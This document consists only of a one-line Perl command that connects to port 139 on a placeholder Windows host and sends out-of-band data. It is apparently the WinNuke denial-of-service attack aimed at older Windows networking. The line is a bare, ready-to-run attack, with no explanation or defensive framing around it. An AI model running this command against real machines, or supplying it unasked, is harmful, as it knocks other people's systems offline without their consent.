perl -MIO::Socket -e 'IO::Socket::INET->new(PeerAddr=>"some.windoze.box:139")->send("bye",MSG_OOB)'
